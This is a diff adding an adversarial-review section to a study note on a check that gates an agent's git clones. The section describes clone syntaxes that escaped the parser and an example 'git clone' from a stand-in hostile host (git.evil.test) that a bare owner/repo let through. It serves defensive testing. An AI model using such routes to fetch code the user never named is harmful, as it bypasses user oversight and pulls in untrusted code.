@@ -50,3 +50,18 @@ study's reading of `ff1f983e`.
 Traces of real sessions that clone or curl, with a ledger attached: how often the clone is of a
 repository the user named (no question), how often it is inferred (a question), and how many
 narrowing questions the taint from a clone causes later in the same run.
+
+## Added after the readings: what an adversarial review found
+
+Written after the run. The corpus and the numbers above are unchanged — rerunning the corpus after
+these fixes reproduces every reading to the row — and the misses are recorded here rather than added
+to the corpus, because rows written after the readings would be rows written to pass.
+
+- **Clone syntaxes the corpus did not have.** `git -c http.sslVerify=false clone URL`, `git -C /tmp
+  clone URL` and `git submodule add URL` were neither asked about nor recorded as fetches: git's
+  global options take a value, and the parser allowed only words starting with `-` before `clone`.
+  Fixed; held by the test parametrisation, not by the corpus.
+- **A bare `owner/repo` named every host.** "Clone psf/requests" let `git clone
+  https://git.evil.test/psf/requests` through, so whoever chose the host kept the user's words. The
+  bare form now names the repository on github.com only; on any other host the user has to have
+  written the host. No corpus row moved: every `named` row off GitHub already spells its host.
